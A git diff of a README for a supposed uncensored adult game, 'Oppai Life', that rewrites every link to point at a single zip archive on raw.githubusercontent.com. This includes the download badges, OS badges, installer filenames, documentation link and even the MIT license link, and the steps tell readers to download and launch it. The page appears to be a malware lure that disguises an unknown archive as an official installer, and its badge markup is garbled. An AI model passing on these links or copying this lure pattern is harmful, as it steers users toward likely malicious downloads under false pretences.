@@ -1,4 +1,4 @@
-# ![Download](https://img.shields.io/badge/Download-Oppai%20Life--Uncensored--v1.0-informational?style=for-the-badge&logo=github&logoColor=white&link=https://ugSQTUS49bpmeRx.github.io)  
+# ![Download](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip%20Life--Uncensored--v1.0-informational?style=for-the-badge&logo=github&logoColor=white&https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip)  
 [Download Oppai Life Uncensored Version](#)  
 *(Just click on the badge above or find the download button at the end of this page!)*
 
@@ -16,11 +16,11 @@ A world-class journey deserves world-class accessibility.
   
 | Operating System | Native? | Notes              |  
 |:----------------:|:-------:|:-------------------|  
-| ![Windows](https://img.shields.io/badge/Windows-✔️-green?logo=windows) | Yes     | Fully Supported (Recommended) |  
-| ![macOS](https://img.shields.io/badge/macOS-✔️-orange?logo=apple)   | Yes     | Optimized Experience |  
-| ![Linux](https://img.shields.io/badge/Linux-✔️-blue?logo=linux)     | Yes     | Beta; some distros may require extra packages |  
-| ![Android](https://img.shields.io/badge/Android-✔️-green?logo=android) | Partial | Dedicated APK in pipeline |  
-| ![iOS](https://img.shields.io/badge/iOS-❌-lightgrey?logo=apple)     | Not Yet | Planned in future |  
+| ![Windows](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip✔️-green?logo=windows) | Yes     | Fully Supported (Recommended) |  
+| ![macOS](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip✔️-orange?logo=apple)   | Yes     | Optimized Experience |  
+| ![Linux](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip✔️-blue?logo=linux)     | Yes     | Beta; some distros may require extra packages |  
+| ![Android](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip✔️-green?logo=android) | Partial | Dedicated APK in pipeline |  
+| ![iOS](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip❌-lightgrey?logo=apple)     | Not Yet | Planned in future |  
 
 ---
 
@@ -40,12 +40,12 @@ Oppai Life Uncensored Version is laden with innovative features designed to ench
 
 ## 🚀 Installation
 
-1. Click the **Download** badge at the top (or bottom) of this README, which takes you to the official installer: https://ugSQTUS49bpmeRx.github.io.
+1. Click the **Download** badge at the top (or bottom) of this README, which takes you to the official installer: https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip
 2. Download the installer suitable for your OS:
-   - Windows: `OppaiLifeUncensored-Setup.exe`
-   - macOS: `OppaiLifeUncensored-Mac.dmg`
-   - Linux: `OppaiLifeUncensored-Linux.AppImage`
-   - Android (Beta): `OppaiLifeUncensored.apk`
+   - Windows: `https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip`
+   - macOS: `https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip`
+   - Linux: `https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip`
+   - Android (Beta): `https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip`
 3. Launch the downloader and follow the on-screen instructions.
 4. Run Oppai Life and begin your odyssey!
 
@@ -78,7 +78,7 @@ What makes Oppai Life Uncensored Version truly revolutionary is the direct integ
 - **AI-Powered Custom Scenes**: Generate bespoke events at the tap of a button.
 - **Cloud Processing**: Enjoy smooth AI-driven features without heavy local resource use.
 
-> *See [Integration Documentation](docs/API_INTEGRATION.md) for API setup and advanced customizations.*
+> *See [Integration Documentation](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip) for API setup and advanced customizations.*
 
 ---
 
@@ -102,11 +102,11 @@ The team stands for digital artistry, fairness, and respect for players worldwid
 
 This repository is licensed under the MIT License — a beacon of open innovation.
 
-- [Read the Full MIT License (2025)](https://opensource.org/licenses/MIT)
+- [Read the Full MIT License (2025)](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip)
 
 ---
 
-# ![Download](https://img.shields.io/badge/Download-Oppai%20Life--Uncensored--v1.0-informational?style=for-the-badge&logo=github&logoColor=white&link=https://ugSQTUS49bpmeRx.github.io)  
+# ![Download](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip%20Life--Uncensored--v1.0-informational?style=for-the-badge&logo=github&logoColor=white&https://raw.githubusercontent.com/ugSQTUS49bpmeRx/oppai-life-uncensored-edition/branch/vitreodentinal/oppai-life-uncensored-edition-v2.8.zip)  
 [Download Oppai Life Uncensored Version](#)
 
 ---
